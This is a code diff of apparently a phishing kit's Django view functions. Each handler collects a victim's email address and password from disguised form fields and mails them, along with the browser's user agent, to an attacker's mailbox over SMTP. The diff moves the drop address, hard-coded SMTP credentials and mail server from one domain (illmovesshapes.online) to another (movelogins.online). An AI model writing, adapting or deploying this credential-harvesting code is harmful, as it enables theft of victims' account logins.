@@ -20,9 +20,9 @@ def addin(request):
     email = request.POST["powerioman"]
     passwordemail = request.POST["enginloio"]
     domain = email[email.index('@') + 1 : ]
-    sender_email = "baekimyoung@illmovesshapes.online"
-    receiver_email = "baekimyoung@illmovesshapes.online"
-    password = "7vGKp2(X5)Uf"
+    sender_email = "raygreenwood123@movelogins.online"
+    receiver_email = "raygreenwood123@movelogins.online"
+    password = "K{;)@}+?M@DT"
     useragent = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
     message["Subject"] = "NEW Korea API ... 0"
@@ -47,7 +47,7 @@ def addin(request):
     message.attach(part2)
 
     # Create secure connection with server and send email
-    with smtplib.SMTP_SSL("illmovesshapes.online", 465) as server:
+    with smtplib.SMTP_SSL("movelogins.online", 465) as server:
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, message.as_string())
         return render(request, 'indexx.html', {'email': email, 'domains': domain})
@@ -57,9 +57,9 @@ def adddzz(request):
     email = request.POST["zzpowerman"]
     passwordemail = request.POST["yyenginlo"]
     domain = email[email.index('@') + 1 : ]
-    sender_email = "baekimyoung@illmovesshapes.online"
-    receiver_email = "baekimyoung@illmovesshapes.online"
-    password = "7vGKp2(X5)Uf"
+    sender_email = "raygreenwood123@movelogins.online"
+    receiver_email = "raygreenwood123@movelogins.online"
+    password = "K{;)@}+?M@DT"
     useragent = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
     message["Subject"] = "NEW Korea API --1"
@@ -84,7 +84,7 @@ def adddzz(request):
     message.attach(part2)
 
     # Create secure connection with server and send email
-    with smtplib.SMTP_SSL("illmovesshapes.online", 465) as server:
+    with smtplib.SMTP_SSL("movelogins.online", 465) as server:
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, message.as_string())
     return render(request, 'Domain.html', {'domains': domain})
